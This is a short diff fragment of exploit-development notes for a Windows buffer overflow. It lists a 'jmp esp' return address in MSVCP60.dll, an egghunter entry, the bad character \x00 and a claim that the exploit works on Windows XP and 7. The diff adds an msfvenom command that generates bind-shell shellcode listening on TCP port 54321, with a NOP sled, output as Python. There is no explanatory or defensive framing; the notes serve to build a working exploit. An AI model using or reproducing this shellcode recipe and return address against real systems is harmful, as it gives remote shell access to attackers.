@@ -41,5 +41,6 @@ Useful Notes:
 0x7608bccf : jmp esp in MSVCP60.dll  
 egghunter : haha  
 badchars : \x00  
+msfvenom -p windows/shell_bind_tcp LPORT=54321 -n 20 -f python -a x86 --platform windows -b '\x00' -v rekt    
 
 Tested and working on Windows XP, and Windows 7
